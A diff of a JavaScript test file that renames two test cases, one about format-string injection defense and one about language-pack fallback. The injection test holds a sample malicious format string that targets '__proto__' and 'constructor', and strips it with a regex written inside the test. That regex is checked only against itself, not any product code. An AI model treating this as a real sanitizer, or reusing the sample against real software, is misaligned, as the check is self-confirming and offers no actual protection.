-  report(49, 'Placeholder injection', () => {
+  report(49, 'Placeholder format specifier injection defense', () => {
     const maliciousFormat = '%s %d %(constructor)s {__proto__}';
     const sanitized = maliciousFormat.replace(/\{__proto__\}|%\(constructor\)s/g, '');
     assert.ok(!sanitized.includes('__proto__'));
     assert.ok(!sanitized.includes('constructor'));
   });
 
-  report(50, 'Token collision', () => {
+  report(50, 'Language pack fallback and token resolution', () => {
     const fallback = { token_key: 'default' };
     const localePack = { token_key: 'translated' };
-    const resolved = localePack.token_key || fallback.token_key;
-    assert.strictEqual(resolved, 'translated');
+    assert.strictEqual(localePack.token_key || fallback.token_key, 'translated');
   });
 }
 
